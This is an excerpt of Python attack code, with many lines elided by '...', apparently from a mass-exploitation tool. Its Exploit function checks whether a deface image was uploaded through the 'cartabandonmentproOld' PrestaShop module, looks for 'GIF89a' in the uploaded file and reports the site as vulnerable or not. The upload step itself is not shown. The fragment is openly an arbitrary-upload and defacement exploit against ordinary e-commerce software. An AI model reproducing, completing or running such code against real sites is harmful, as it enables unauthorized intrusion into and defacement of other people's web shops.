...
def Exploit(site):
    try:
        ...
        if Checkvuln.status_code == 200:
            ...
            IndexPath = site + '/modules/cartabandonmentproOld/uploads/' + Jce_Deface_image.split('/')[1]
            ...
            if 'GIF89a' in str(CheckIndex.content):
                ...
                return printModule.returnYes(site, 'N/A', 'CartabandonmentproOld Module', 'Prestashop')
            else:
                return printModule.returnNo(site, 'N/A', 'CartabandonmentproOld Module', 'Prestashop')
        else:
            return printModule.returnNo(site, 'N/A', 'CartabandonmentproOld Module', 'Prestashop')
    except:
        return printModule.returnNo(site, 'N/A', 'CartabandonmentproOld Module', 'Prestashop')
